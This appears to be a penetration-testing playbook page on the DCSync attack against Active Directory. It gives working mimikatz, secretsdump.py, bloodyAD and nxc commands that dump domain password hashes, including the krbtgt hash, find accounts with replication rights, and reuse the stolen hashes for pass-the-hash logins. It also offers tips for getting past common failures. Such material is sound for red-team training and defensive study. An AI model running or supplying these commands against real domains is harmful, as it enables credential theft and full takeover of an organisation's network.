# DCSync

## When this applies

- You have an account with `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` rights on the domain object.
- Common holders: Domain Admins, Enterprise Admins, dedicated backup/sync service accounts (`svc_loanmgr`, `backupops`, `ad_sync`, `azureadconnect`).
- Goal: dump credentials (NT hashes, Kerberos keys) from the DC's NTDS database without RDP/WinRM access.

## Technique

DCSync impersonates a Domain Controller and uses the MS-DRSR replication protocol to request user secrets. Any account with replication rights can do this remotely against any DC.

## Steps

```powershell
# Dump credentials from DC (Windows / mimikatz)
.\mimikatz.exe
lsadump::dcsync /domain:domain.com /user:Administrator
```

```bash
# From Linux — works with cleartext password OR NT hash via -hashes
secretsdump.py 'domain/user:pass@DC_IP' -just-dc-user Administrator
secretsdump.py 'domain/user@DC_IP' -hashes :NTHASH -just-dc-user krbtgt
secretsdump.py 'domain/user:pass@DC_IP' -just-dc           # everyone

# ⚠ LOCALE-AWARE ADMIN ACCOUNT NAME — always check the locale BEFORE -just-dc-user.
# RID-500 is the built-in admin but its sAMAccountName depends on the install language:
#   en-US: Administrator      es-ES: Administrador     fr-FR: Administrateur
#   de-DE: Administrator      it-IT: Amministratore    pt-BR: Administrador
#   ru-RU: Администратор      ja-JP: Administrator (kept English on Server)
# Resolve by RID rather than guessing:
#   nxc smb DC_IP -u user -p pass --rid-brute 500
#   bloodyAD -d dom -u user -p pass --host DC get object 'CN=Users,DC=dom,DC=com' \
#     --filter '(objectSid=*-500)' --attr sAMAccountName
# Then -just-dc-user "<that name>". Failing this is the classic "DCSync returns 'user not found'"
# trap on FR/ES/PT-locale DCs.

# Common AD pattern: a backup/sync service account ("svc_loanmgr", "backupops",
# "ad_sync", "azureadconnect") was granted GetChanges + GetChangesAll for
# replication. Always check ACLs on the domain object after foothold:
bloodyAD -d domain -u user -p pass --host DC_IP get object 'DC=domain,DC=com' \
  --resolve-sid | grep -iE 'getchanges|replicat'
# If your foothold user is in the result → straight to DCSync, no ACL chain needed.

# Pass-the-hash with the result, no ticket conversion needed:
nxc winrm DC_IP -u Administrator -H NTHASH         # PtH → WinRM shell
nxc smb   DC_IP -u Administrator -H NTHASH         # PtH → SMB
nxc ldap  DC_IP -u Administrator -H NTHASH --query '(objectClass=user)'
nxc mssql HOST   -u sa            -H NTHASH        # works for SQL too if applicable
# All four nxc protocols accept -H. Skip the impacket → ticketer → evil-winrm dance.
```

## Verifying success

- `secretsdump.py` outputs lines `<user>:<RID>:<LM>:<NT>:::` for each replicated principal.
- The recovered `krbtgt` hash enables Golden Ticket forgery (`golden-ticket.md`).

## Common pitfalls

- Wrong locale Administrator name → "user not found". Always RID-resolve via `nxc smb --rid-brute 500` first.
- Server 2025 / hardened DCs: replication may require LDAPS or signing — pass `-secure` on `bloodyAD` if errors.
- `secretsdump.py` against a Read-Only DC (RODC) only returns the limited cached set — use the EXOP_REPL_SECRETS technique for RODC krbtgt extraction.

## Tools

- mimikatz (`lsadump::dcsync`)
- impacket `secretsdump.py`
- bloodyAD (`get object --resolve-sid`)
- nxc (`-H` for PtH on `winrm`, `smb`, `ldap`, `mssql`)
